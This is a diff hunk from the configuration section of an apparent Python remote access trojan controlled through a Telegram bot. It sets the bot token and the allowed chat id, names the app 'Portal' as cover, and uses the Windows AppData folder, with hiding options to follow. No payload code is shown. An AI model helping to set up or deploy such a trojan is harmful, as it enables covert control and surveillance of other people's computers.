@@ -25,13 +25,13 @@ import getpass											# get username
 import collections
 me = singleton.SingleInstance()
 # REPLACE THE LINE BELOW WITH THE TOKEN OF THE BOT YOU GENERATED!
-#token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll'
-token = os.environ['RAT_TOKEN'] 						# you can set your environment variable as well
+token = 'nnnnnnnnn:lllllllllllllllllllllllllllllllllll' # <== put Token Here
+#token = os.environ['RAT_TOKEN'] <== Set Variable Here and Usse it
 # This will be used for setting paths and related file io -- change to whatever you want
 app_name = 'Portal'
 # ADD YOUR chat_id TO THE LIST BELOW IF YOU WANT YOUR BOT TO ONLY RESPOND TO ONE PERSON!
-known_ids = []
-known_ids.append(os.environ['TELEGRAM_CHAT_ID']) 		# make sure to remove this line if you don't have this environment variable
+known_ids = '' # put Chat_id Here
+#known_ids.append(os.environ['TELEGRAM_CHAT_ID']) 		# make sure to remove this line if you don't have this environment variable
 appdata_roaming_folder = os.environ['APPDATA']			# = 'C:\Users\Username\AppData\Roaming'
 														# HIDING OPTIONS
 														# ---------------------------------------------
